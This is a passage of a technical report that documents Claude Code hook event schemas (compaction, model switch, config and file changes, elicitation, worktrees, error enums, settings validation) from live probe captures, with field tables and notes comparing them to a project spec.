- `idle_prompt` arrived 60.0 s after the turn's `Stop` (15:38:39.241 → 15:39:39.272) with no keystroke in between. The binary's idle timer (class `wee`) only sends it when no user interaction happened after the last completed query and no dialog is on screen; sender in `binary/runtime-source-snippets.txt` line 25.
- `-p` does emit Notification for MCP elicitation (`elicitation_response`), but never `permission_prompt`/`idle_prompt` (no prompt UI).

**Spec alignment:**
- spec line 937 value set: `permission_prompt` and `idle_prompt` verified (TUI only). `agent_needs_input`, `elicitation_dialog` and `elicitation_url_dialog` are in the binary list `VAr` but were not observed. Other real values: `elicitation_response` (observed), `auth_success`, `elicitation_complete`, `agent_completed`, `worker_permission_prompt`, `push_notification`, `computer_use_enter`, `computer_use_exit`. Audit: line 937 names only the needs-you subset, so leaving out non-blocking types (`auth_success`, `agent_completed`, `elicitation_response`, …) is not a mismatch. `worker_permission_prompt` is the one unlisted value that may be a needs-you ask; its meaning was not probed.
- spec line 957 (`quota_auto_resume_fired|stale|disabled`): present in `VAr`, not provoked (needs a real quota exhaustion).
- spec line 883 (Notification → `needs_you`): headless (`owned` `-p`) sessions never emit `permission_prompt`/`idle_prompt`; for them `needs_you` can only come from `PermissionRequest`.

---

## MessageDisplay

- **Produced by:** Claude Code 2.1.270 (zod `nce`; dispatched with `forceSyncExecution:!0`)
- **Consumed by:** §8 line 916 (liveness); M1
- **Probe:** `run_probes.py S01` + `interactive_probe.py`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S01`
- **Status:** partially verified — all fields live 2026-09-14 (51 captures), but only `index:0`, `final:true`; multi-chunk messages (`index>0`, `final:false`) are not in any retained capture. Audit: downgraded from "verified"

**Real example** (trimmed; full capture: `live/S01_startup_tools/events.jsonl`)

```json
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"23d7f57d-6e63-45f1-9217-c7395a4c98a9","hook_event_name":"MessageDisplay","turn_id":"ea71826b-de48-41a0-8473-f4901639f66e","message_id":"1accf04d-c666-45f6-91d2-e334ba34b521","index":0,"final":true,"delta":"FINISHED"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `turn_id` | string (UUID) | always | | |
| `message_id` | string (UUID) | always | | "Not the API msg_… id" (schema) |
| `index` | int | always | `0` in all retained captures | schema: chunk index within one `message_id`; multi-chunk flushes not retained |
| `final` | bool | always | `true` in all retained captures | |
| `delta` | string | always | the displayed text chunk | |
| `permission_mode` | — | never | — | |

**Variants and edge cases:** fired even for synthetic error messages (the model-not-found text in S07); one MessageDisplay per displayed assistant message in `-p`.

**Spec alignment:** aligned (liveness only). Volume note for §18 line 2327: MessageDisplay is synchronous (`forceSyncExecution`), so a slow hook delays display.

---

## PreCompact / PostCompact

- **Produced by:** Claude Code 2.1.270 (zod `Lle` / `Ule`)
- **Consumed by:** §8 line 921; `context_exhausted` rule (line 966); M2
- **Probe:** `run_probes.py S05` (manual) and `S22` (auto attempt). Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S05 S22`
- **Status:** partially verified — `trigger:"manual"` live; `trigger:"auto"` binary only

**Real example** (trimmed; full capture: `live/S05_compact/events.jsonl`)

```json
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"4cd9a4b3-3847-487a-bdad-6d2317fe2948","hook_event_name":"PreCompact","trigger":"manual","custom_instructions":null}
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"4cd9a4b3-3847-487a-bdad-6d2317fe2948","hook_event_name":"PostCompact","trigger":"manual","compact_summary":"<analysis>\nThe conversation consists of a single, structured request from the user to execute a specific sequ..."}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `trigger` | enum | always | `manual` | binary `["manual","auto"]` |
| `custom_instructions` | string or null | always (Pre) | `null` | |
| `compact_summary` | string | always (Post) | the summary text | |
| `permission_mode` | — | never | — | |

**Variants and edge cases:** `/compact` sent as the `-p` prompt works; sequence Pre → internal SubagentStop → SessionStart{compact} → Post (14.7 s). Auto-compaction not provoked: S22 made the mock API report `input_tokens: 195000` on the first call; the second request went out with no compaction (`live/S22_mock_autocompact/mock-requests.jsonl`; `live/S22_mock_autocompact/debug-extras.txt`: `turn 1 end (turns=2 usage in=195050 …)`), and a second streamed user message was folded into the same turn.

**Spec alignment:** spec line 966 `PreCompact{auto}`: field is `trigger`, value `auto` is in the enum; not observed live.

---

## PreModelSwitch / PostModelSwitch

- **Produced by:** Claude Code 2.1.270 (zod `Fle` / `Ble` + `Qz`)
- **Consumed by:** §8 line 922 (identity); §7 `model` column; M1
- **Probe:** `run_probes.py S14`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S01 S14`
- **Status:** partially verified — `source:"command"` live; `picker`, `sdk`, `auto`, `resume` binary only

**Real example** (trimmed; full capture: `live/S14_model_switch/events.jsonl`)

```json
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"a7f810bc-7d70-4676-9a0b-aea4535f716f","hook_event_name":"PreModelSwitch","from_model":"claude-haiku-4-5-20251001","to_model":"claude-sonnet-5","requested_model":"sonnet","source":"command","context_tokens":1844,"prompt_cache_warm":false,"cache_ttl":"1h","estimated_cache_write_usd":0.0074,"pricing":"catalog"}
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"a7f810bc-7d70-4676-9a0b-aea4535f716f","hook_event_name":"PostModelSwitch","from_model":"claude-haiku-4-5-20251001","to_model":"claude-sonnet-5","requested_model":"sonnet","source":"command","context_tokens":1844,"prompt_cache_warm":false,"cache_ttl":"1h","estimated_cache_write_usd":0.0074,"pricing":"catalog"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `from_model` / `to_model` | string | always | `claude-haiku-4-5-20251001` → `claude-sonnet-5` | resolved ids |
| `requested_model` | string or null | always | `sonnet` | the alias typed |
| `source` | enum | always | `command` | Pre: `command,picker,sdk`; Post adds `auto,resume` |
| `context_tokens` | int | always | `1844` | |
| `prompt_cache_warm` | bool | always | `false` | |
| `cache_ttl` | enum | always | `1h` | `5m`/`1h` |
| `estimated_cache_write_usd` | number | always | `0.0074` | |
| `pricing` | enum | always | `catalog` | `configured/catalog/default` |

**Variants and edge cases:** `--resume` with a different `--model` emitted **no** model-switch event (`live/S14b_resume_other_model/events.jsonl`).

**Spec alignment:** aligned (names only in spec).

---

## InstructionsLoaded

- **Produced by:** Claude Code 2.1.270 (zod `Xle`)
- **Consumed by:** not consumed by the spec
- **Probe:** `run_probes.py S01 S03 S12`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S12`
- **Status:** partially verified — `load_reason:"session_start"`, `memory_type:"Project"` live; other values binary only

**Real example** (trimmed; full capture: `live/S03_continue/events.jsonl`)

```json
{"session_id":"437540c8-e30c-492c-ad1b-201b3b5f586f","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/437540c8-e30c-492c-ad1b-201b3b5f586f.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","hook_event_name":"InstructionsLoaded","file_path":"/tmp/shp-hooks-base-dwqg6d95/CLAUDE.md","memory_type":"Project","load_reason":"session_start"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `file_path` | string | always | `<cwd>/CLAUDE.md` | |
| `memory_type` | enum | always | `Project` | `User/Project/Local/Managed` |
| `load_reason` | enum | always | `session_start` | `session_start/nested_traversal/path_glob_match/include/compact` |
| `globs` / `trigger_file_path` / `parent_file_path` | | never observed | — | |

**Variants and edge cases:** fires before SessionStart; on `--continue` it carried a provisional `session_id` different from the resumed one (example above vs `SessionStart` `8bbcceab…` in the same file).

**Spec alignment:** aligned (not referenced).

---

## ConfigChange

- **Produced by:** Claude Code 2.1.270 (zod `$le`)
- **Consumed by:** not consumed by the spec; relevant to §15 (Shepherd editing `~/.claude/settings.json` under running sessions)
- **Probe:** `run_probes.py S21`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S21`
- **Status:** partially verified — `source:"local_settings"` live; other sources binary only

**Real example** (trimmed; full capture: `live/S21_config_change/events.jsonl`)

```json
{"session_id":"ca162c8a-8d5d-48ea-9f1f-bdfcb268cf01","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-config-33ijfqat/ca162c8a-8d5d-48ea-9f1f-bdfcb268cf01.jsonl","cwd":"/tmp/shp-hooks-config-33ijfqat","prompt_id":"3f733a88-ae47-495e-996f-eed94453ae1d","hook_event_name":"ConfigChange","source":"local_settings","file_path":"/tmp/shp-hooks-config-33ijfqat/.claude/settings.local.json"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `source` | enum | always | `local_settings` | `user_settings/project_settings/local_settings/policy_settings/skills` |
| `file_path` | string | always | `<cwd>/.claude/settings.local.json` | optional in schema |

**Variants and edge cases:** triggered by an outside process rewriting the file mid-session. A Bash write to a `.claude/settings.local.json` path by the model raised a PermissionRequest even with `--allowedTools Bash` (`live/S13_watch_cwd_config/events.jsonl`).

**Spec alignment:** aligned (not referenced). Implication for §15: a running session observes Shepherd's install/uninstall edits live (debug `Watching for changes in setting files /root/.claude/settings.json, …`).

---

## CwdChanged

- **Produced by:** Claude Code 2.1.270 (zod `Zle`)
- **Consumed by:** §8 line 922 (identity); D22 (cwd → repo binding); M1
- **Probe:** `run_probes.py S13`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S13`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `live/S13_watch_cwd_config/events.jsonl`)

```json
{"session_id":"a52f91c4-4b46-49b1-9d95-c0c52b8a28af","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-watch-jnn4-1pq/a52f91c4-4b46-49b1-9d95-c0c52b8a28af.jsonl","cwd":"/tmp/shp-hooks-watch-jnn4_1pq/sub","prompt_id":"5c654ba4-f0b2-415a-baf9-1cacbcf1b5dc","hook_event_name":"CwdChanged","old_cwd":"/tmp/shp-hooks-watch-jnn4_1pq","new_cwd":"/tmp/shp-hooks-watch-jnn4_1pq/sub"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `old_cwd` / `new_cwd` | string | always | `/tmp/shp-hooks-watch-jnn4_1pq` → `…/sub` | |

**Variants and edge cases:** the common `cwd` already shows the new directory on this event (and on the PostToolUse of the `cd` call). The Bash cwd persists: the next `pwd` call printed `…/sub` and emitted no further CwdChanged.

**Spec alignment:** aligned.

---

## FileChanged

- **Produced by:** Claude Code 2.1.270 (zod `ece`)
- **Consumed by:** §8 line 886 and line 923 (`repos_touched`); §7 line 680; D22; §18 line 2330; M1
- **Probe:** `run_probes.py S13 S21` (+ negative control S09 acceptEdits Write). Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S13 S21`
- **Status:** partially verified — `event:"change"` and `"unlink"` live 2026-09-14 for hook-returned `watchPaths`. `event:"add"` was never observed. Watch paths declared through the `FileChanged` matcher come from the binary only. Audit: downgraded from "verified"

**Real example** (trimmed; full captures: `live/S13_watch_cwd_config/events.jsonl`, `live/S21_config_change/events.jsonl`)

```json
{"session_id":"a52f91c4-4b46-49b1-9d95-c0c52b8a28af","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-watch-jnn4-1pq/a52f91c4-4b46-49b1-9d95-c0c52b8a28af.jsonl","cwd":"/tmp/shp-hooks-watch-jnn4_1pq","prompt_id":"5c654ba4-f0b2-415a-baf9-1cacbcf1b5dc","hook_event_name":"FileChanged","file_path":"/tmp/shp-hooks-watch-jnn4_1pq/watched.txt","event":"change"}
{"session_id":"ca162c8a-8d5d-48ea-9f1f-bdfcb268cf01","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-config-33ijfqat/ca162c8a-8d5d-48ea-9f1f-bdfcb268cf01.jsonl","cwd":"/tmp/shp-hooks-config-33ijfqat","prompt_id":"3f733a88-ae47-495e-996f-eed94453ae1d","hook_event_name":"FileChanged","file_path":"/tmp/shp-hooks-config-33ijfqat/watched.txt","event":"unlink"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `file_path` | string | always | the watched path | |
| `event` | enum | always | `change`, `unlink` | binary `change/add/unlink`; the re-create in S21 did not emit `add` before exit |

**Variants and edge cases:** FileChanged fires **only for paths a hook registered** via `hookSpecificOutput.watchPaths` (SessionStart/CwdChanged/FileChanged output). S13 debug: `Hook SessionStart (…emit_watchpaths.sh) provided 1 watchPaths` then `FileChanged: change …/watched.txt`. Claude's own `Write` of `./inside.txt` in `acceptEdits` produced no FileChanged (`live/S09_perm_acceptEdits_write_inside/events.jsonl`).
- Audit (binary only, not live): the watcher also takes paths from the settings `FileChanged` groups' `matcher`. Each matcher is split on `|`, relative names are resolved against the cwd, and the result is merged with hook-returned `watchPaths` (`for(let De of Pe){if(!De.matcher)continue;for(let We of De.matcher.split("|")…`, near byte offset 192424700 of `/root/.local/share/claude/versions/2.1.270`; debug `FileChanged: watching N paths`). So "only hook-declared `watchPaths`" is incomplete: literal file names in the matcher are watched too. Every probe used `matcher:"*"`, which names no real file.

**Spec alignment:**
- spec lines 680 and 886 say `repos_touched` accumulates from `FileChanged`; reality: FileChanged does not report files the agent edits. It reports only declared watch paths: hook-returned `watchPaths` (live: S13, S21; negative control S09), plus `FileChanged` matcher file names (binary only, see above). `repos_touched` needs PostToolUse `tool_input.file_path` (Edit/Write) and Bash cwd, or a watch list Shepherd returns from a SessionStart hook.

---

## DirectoryAdded

- **Produced by:** Claude Code 2.1.270 (zod `tce`)
- **Consumed by:** not consumed by the spec; relevant to D22 (multi-repo sessions)
- **Probe:** `interactive_probe.py`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/interactive_probe.py`
- **Status:** partially verified — TUI `/add-dir` (`source:"slash_command"`) live; `register_repo_root` binary only

**Real example** (trimmed; full capture: `live/I01_interactive/events.jsonl`)

```json
{"session_id":"1dda4143-3fdf-40ef-b167-252c1abd1e15","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-tui-1tlg88mq/1dda4143-3fdf-40ef-b167-252c1abd1e15.jsonl","cwd":"/tmp/shp-hooks-tui-1tlg88mq","scratchpad_dir":"/tmp/claude-0/-tmp-shp-hooks-tui-1tlg88mq/1dda4143-3fdf-40ef-b167-252c1abd1e15/scratchpad","prompt_id":"cfa5fa22-e087-4fa8-ba98-df48e4975351","hook_event_name":"DirectoryAdded","directory":"/tmp/shp-hooks-tui-extra-ye47wasb","source":"slash_command"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `directory` | string | always | the added dir | |
| `source` | enum | always | `slash_command` | binary `slash_command/register_repo_root` |

**Variants and edge cases:** `--add-dir` at launch was not tested for this event.

**Spec alignment:** aligned (not referenced).

---

## Elicitation / ElicitationResult

- **Produced by:** Claude Code 2.1.270 (zod `Kle` / `jle`)
- **Consumed by:** §8 line 917 (needs-you); M1
- **Probe:** `run_probes.py S17` with the stdio MCP server `mcp_elicit.py`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S17`
- **Status:** partially verified — `form` mode with `-p` auto-cancel live; `url` mode and `accept`/`decline` binary only

**Real example** (trimmed; full capture: `live/S17_elicitation/events.jsonl`; MCP wire log `live/S17_elicitation/mcp-messages.jsonl`)

```json
{"session_id":"d7624398-e34c-412b-aef6-07060eef081c","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-elicit-zg1uunox/d7624398-e34c-412b-aef6-07060eef081c.jsonl","cwd":"/tmp/shp-hooks-elicit-zg1uunox","prompt_id":"d5b1bc68-9ff2-495b-b0f8-3a88b3994f0c","hook_event_name":"Elicitation","mcp_server_name":"shpelicit","message":"What name should the probe use?","mode":"form","requested_schema":{"type":"object","properties":{"name":{"type":"string"}},"required":["name"]}}
{"session_id":"d7624398-e34c-412b-aef6-07060eef081c","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-elicit-zg1uunox/d7624398-e34c-412b-aef6-07060eef081c.jsonl","cwd":"/tmp/shp-hooks-elicit-zg1uunox","prompt_id":"d5b1bc68-9ff2-495b-b0f8-3a88b3994f0c","hook_event_name":"ElicitationResult","mcp_server_name":"shpelicit","mode":"form","action":"cancel"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `mcp_server_name` | string | always | `shpelicit` | matcher value |
| `message` | string | always (Elicitation) | | |
| `mode` | enum | always | `form` | `form/url` |
| `requested_schema` | object | always (Elicitation) | | |
| `url`, `elicitation_id` | string | never observed | — | url mode |
| `action` | enum | always (Result) | `cancel` | `accept/decline/cancel` |
| `content` | object | never observed | — | |

**Variants and edge cases:** in `-p` the client answered `{"action":"cancel"}` within 10 ms and then emitted `Notification{elicitation_response}`; the session never blocked.

**Spec alignment:** spec line 917 treats Elicitation as needs-you; in `-p` it is auto-cancelled immediately, so it is not a blocking state there.

---

## Setup

- **Produced by:** Claude Code 2.1.270 (zod `Mle`)
- **Consumed by:** not consumed by the spec
- **Probe:** `run_probes.py S16`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S16`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `live/S16_setup__maintenance/events.jsonl`)

```json
{"session_id":"8579b64c-02b2-4e71-83ab-272017f810a3","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-setup-5053kbfl/8579b64c-02b2-4e71-83ab-272017f810a3.jsonl","cwd":"/tmp/shp-hooks-setup-5053kbfl","hook_event_name":"Setup","trigger":"maintenance"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `trigger` | enum | always | `init` (`--init`, `--init-only`), `maintenance` (`--maintenance`) | fires before SessionStart |

**Variants and edge cases:** `--init-only` exits after Setup/SessionStart/SessionEnd without a prompt.

**Spec alignment:** aligned (not referenced).

---

## WorktreeCreate / WorktreeRemove

- **Produced by:** Claude Code 2.1.270 (zod `Jle` / `Qle`)
- **Consumed by:** not consumed by the spec; relevant to D15 (worker worktrees)
- **Probe:** `run_probes.py S15`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S15`
- **Status:** partially verified — WorktreeCreate live; WorktreeRemove binary only

**Real example** (trimmed; full capture: `live/S15_worktree/events.jsonl`)

```json
{"session_id":"2078d6fd-468c-456d-bbcd-1000d6ba4eeb","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-wt-uccy58xp/2078d6fd-468c-456d-bbcd-1000d6ba4eeb.jsonl","cwd":"/tmp/shp-hooks-wt-uccy58xp","hook_event_name":"WorktreeCreate","name":"shpwt"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `name` | string | always | `shpwt` (from `--worktree shpwt`) | |
| `worktree_path` | string | (WorktreeRemove) not observed | — | |

**Variants and edge cases:** **registering any WorktreeCreate command hook replaces git worktree creation**: the capture hook printed nothing and the launch failed with `Error creating worktree: WorktreeCreate hook failed: hook succeeded but returned no worktree path` (`live/S15_worktree/stderr.txt`, exit 1). A catch-all "subscribe to every event" dispatcher must not register WorktreeCreate.

**Spec alignment:** aligned (not referenced). Audit: the heading on §8 line 893 says "one dispatcher, all events", but the text says `hookd.py` is registered for "every event we need" (lines 895–896), and the subscribed list (lines 912–923) leaves out WorktreeCreate. So the spec does not register it; the claimed misalignment is refuted. Caution for implementers: never add WorktreeCreate to a catch-all install, because that breaks `--worktree` (S15).

---

## TeammateIdle

- **Produced by:** Claude Code 2.1.270 (zod `Hle`)
- **Consumed by:** not consumed by the spec
- **Probe:** `extract_binary.py` → `binary/hook-input-schemas.txt`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/extract_binary.py`
- **Status:** not verifiable here — requires the agent-teams feature; not attempted

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/hooks/binary/hook-input-schemas.txt`)

```text
Hle=f(()=>we().and(u({hook_event_name:R("TeammateIdle"),teammate_name:o(),team_name:o()
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `teammate_name` | string | not observed | — | schema |
| `team_name` | string | not observed | — | schema |

**Variants and edge cases:** none observed.

**Spec alignment:** aligned (not referenced).

---

## Enumerations (SessionStart.source, SessionEnd.reason, StopFailure.error, Notification.notification_type)

- **Produced by:** Claude Code 2.1.270 (`binary/enums.json`; error assignment counts `binary/stopfailure-error-assignments.txt`)
- **Consumed by:** §8 lines 937, 951–971, 1205; D21; M2
- **Probe:** `extract_binary.py` + `run_probes.py S04 S05 S06 S07 S08` + `interactive_probe.py`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/extract_binary.py && python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S07 S08`
- **Status:** partially verified (per value below)

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/hooks/binary/enum-sources.txt`)

```text
o_=f(()=>V(["authentication_failed","oauth_org_not_allowed","account_on_hold","verification_required","billing_error","rate_limit","overloaded","invalid_request","model_not_found","server_error","unknown","max_output_tokens","cloud_credential_error"]))
rce=["clear","resume","logout","prompt_input_exit","other"]
R("SessionStart"),source:V(["startup","resume","clear","compact","fork"])
VAr=["permission_prompt","idle_prompt","auth_success","elicitation_dialog","agent_needs_input","agent_completed","elicitation_url_dialog","worker_permission_prompt","push_notification","computer_use_enter","computer_use_exit","quota_auto_resume_fired","quota_auto_resume_stale","quota_auto_resume_disabled"]
```

**SessionStart.source** (binary enum): `startup` live (S01) · `resume` live (S02 `--resume`, S03 `--continue`) · `fork` live (S04 `--fork-session`) · `compact` live (S05 `/compact`) · `clear` live (S06, I01 `/clear`).

**SessionEnd.reason** (binary enum): `other` live (every `-p` exit) · `clear` live (S06, I01) · `prompt_input_exit` live (I01 `/exit`) · `logout` not verified (would sign out the real account) · `resume` not verified (TUI `/resume` switch not attempted).

**StopFailure.error** (binary enum `o_`, 13 values), with the stimulus that produced each observed value:

| error | assignments in binary | Observed | Stimulus |
|---|---|---|---|
| `authentication_failed` | 10 | yes | mock HTTP 401 `authentication_error`; mock HTTP 403 `permission_error` |
| `oauth_org_not_allowed` | 1 | no | needs a real org policy |
| `account_on_hold` | 1 | no | needs a real account state |
| `verification_required` | 1 | no | — |
| `billing_error` | 1 | yes | mock HTTP 400 "Your credit balance is too low…" |
| `rate_limit` | 10 | yes | mock HTTP 429 |
| `overloaded` | **0** | no | mock HTTP 529 produced `server_error` instead |
| `invalid_request` | 37 | yes | mock HTTP 400 "prompt is too long…" (with `error_details`) |
| `model_not_found` | 2 | yes | **real API** `--model claude-nonexistent-model-shp` (S07); mock HTTP 404 |
| `server_error` | 8 | yes | mock HTTP 500; mock HTTP 529 |
| `unknown` | 4 | yes | mock HTTP 400 `messages: field required` |
| `max_output_tokens` | 2 | yes | mock SSE `stop_reason:"max_tokens"` |
| `cloud_credential_error` | 1 | no | 3P cloud providers only |

**Notification.notification_type** — the binary list `VAr` (14 values): `permission_prompt` live (I01) · `idle_prompt` live (I01) · `auth_success` · `elicitation_dialog` · `agent_needs_input` · `agent_completed` · `elicitation_url_dialog` · `worker_permission_prompt` · `push_notification` · `computer_use_enter` · `computer_use_exit` · `quota_auto_resume_fired` · `quota_auto_resume_stale` · `quota_auto_resume_disabled`. Also emitted but **not** in `VAr`: `elicitation_response` live (S17), `elicitation_complete` (binary literal).

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| (enum values) | string | — | see lists above | mock-API results reflect Claude Code's own error mapping of a real HTTP status/body, not a real outage |

**Variants and edge cases:** the mock runs used an isolated `CLAUDE_CONFIG_DIR`, a fake `ANTHROPIC_API_KEY`, `CLAUDE_CODE_MAX_RETRIES=0`; with retries on, 429/529/5xx would be retried before StopFailure.

**Spec alignment:** see StopFailure (`overloaded` unreachable, plain 400 → `unknown`, two values missing), SessionEnd (`end_reason` → `reason`), SessionStart (`start_reason` → `source`), Notification (value set).

---

## Hooks config schema (`hooks` in settings.json)

- **Produced by:** Claude Code 2.1.270 settings validator (`Rd()`, `Rt`, `Gq`, `A6()`/`kzn()` in `binary/settings-hook-config-schema.txt`)
- **Consumed by:** §8 "Hook installation" (lines 893–907); §15 install/uninstall with `_shepherd_managed` (lines 2230–2233); §6 `install_hooks()`/`uninstall_hooks()`; principle 4; M1, M6
- **Probe:** `run_probes.py R03 R04 R05 S13`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py R03 R04 R05`
- **Status:** partially verified — project, local and `--settings` scopes live 2026-09-14; user scope (`~/.claude/settings.json`) not tested (probe safety rule forbids editing it)

**Real example** (trimmed; full captures: `live/S01_startup_tools/settings.json` [accepted], `live/R03_config_pretooluse_broken/doctor.txt`, `live/R03_config_stop_not_a_list/doctor.txt`)

```json
  "PreToolUse": [
   {
    "hooks": [
     {
      "type": "command",
      "command": "/root/Shepherd/docs/probes/2026-09-14-schemas/hooks/capture_hook.sh PreToolUse /root/Shepherd/docs/probes/2026-09-14-schemas/hooks/live/S01_startup_tools/events.jsonl",
      "timeout": 15,
      "_shepherd_managed": true
     },
     {
      "type": "command",
      "command": "/root/Shepherd/docs/probes/2026-09-14-schemas/hooks/capture_env.py PreToolUse /root/Shepherd/docs/probes/2026-09-14-schemas/hooks/live/S01_startup_tools/env.jsonl",
      "timeout": 15
     }
    ],
    "matcher": "*"
   }
  ]
```

```text
Invalid settings
- /tmp/shp-hooks-cfg-stop_not_a_list-hw_5z0an/.claude/settings.json › hooks.Stop: Hook event "Stop" must be an array of matchers; received string. This entry was ignored.
Invalid settings
- /tmp/shp-hooks-cfg-pretooluse_broken-dr33pv68/.claude/settings.json › hooks.PreToolUse.0.hooks.0: Invalid command hook (command: Invalid input) — a PreToolUse/PermissionRequest hook that cannot be loaded may be what guards the permissions declared beside it, so nothing it sits in is applied until the entry is fixed or removed.
- /tmp/shp-hooks-cfg-pretooluse_broken-dr33pv68/.claude/settings.json › hooks.PreToolUse.0.hooks.0.command: Expected string, but received undefined
  Suggested fix: Command hooks require command. For exec form (no shell), set command to the executable and args to its arguments: {"type": "command", "command": "echo", "args": ["hi"]}. For shell form, set command to the full shell string: {"type": "command", "command": "echo hi"}.
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `hooks` | object `{<EventName>: Group[]}` | — | | an array here disables every hook in the file (doctor: `"hooks" must be an object …`) |
| `Group.matcher` | string | optional | `"*"`, `"Bash"`, `"startup"` | omitted key accepted and matches all (R03 no_matcher_key fired); `"*"` accepted on events without matchers |
| `Group.hooks` | array of entries | required | | |
| `entry.type` | enum | required | `command` | also `prompt`, `agent`, `http`, `mcp_tool` |
| `entry.command` | string | required for `command` | shell string | runs via `/bin/sh -c` |
| `entry.args` | string[] | optional | not used | exec form, no shell |
| `entry.timeout` | positive number (seconds) | optional | `10`, `15`, `2` | `-5` → entry ignored; default 600 s (`Mp=600000`) |
| `entry.async` | bool | optional | `true` (R02) | runs in background |
| `entry.if`, `shell` (`bash`/`powershell`), `statusMessage`, `once`, `asyncRewake`, `rewakeMessage`, `rewakeSummary`, `cloud` | | optional | not used | schema only |
| `entry._shepherd_managed` (extra key) | any | — | `true` on every probe entry | accepted silently; hooks fired and `claude doctor` reported nothing (R03 extra_keys) |

**Variants and edge cases** (what `-p` did silently; what `claude doctor` then said):
- Invalid JSON in `settings.json`: the whole file ignored; `settings.local.json` next to it still loaded (`Expected object, but received undefined`).
- `hooks.Stop: "not-a-list"`: only that event dropped (`This entry was ignored.`); other hooks in the file fired.
- Unknown event `BogusEvent`: dropped, rest fired.
- Negative `timeout` / unknown `type`: that entry dropped (`entry ignored`), rest fired.
- **A broken `PreToolUse` or `PermissionRequest` entry disables every hook in that file** (doctor: "nothing it sits in is applied until the entry is fixed or removed"; the file's valid UserPromptSubmit probe did not fire, `live/R03_config_pretooluse_broken/events.jsonl`).
- Hooks given only through `--settings <file>` load and fire (R04).
- No validation message appears in `-p` stderr or the debug log for any of these; only `claude doctor` shows them.

**Spec alignment:**
- spec lines 2231–2232 (`"_shepherd_managed": true` on each entry): accepted in project/local/`--settings` scope (R03 extra_keys, all S* runs). Not tested in user scope.
- spec line 2230 (merge into `~/.claude/settings.json`): a user's own malformed PreToolUse/PermissionRequest entry in that file silently disables Shepherd's hooks too (R03 pretooluse_broken); install should validate the merged file with `claude doctor` or the same rules.
- spec line 893 ("one dispatcher, all events"): not a mismatch. The subscribed list (lines 912–923) leaves out WorktreeCreate, and registering it would break `--worktree` (see WorktreeCreate).

---

## Hook runtime contract (process, stdin, env, exit codes, stdout, timeout, sync, ancestry)

- **Produced by:** Claude Code 2.1.270 hook runner (`VE()`, `rS()`, `fet()` in `binary/runtime-source-snippets.txt`)
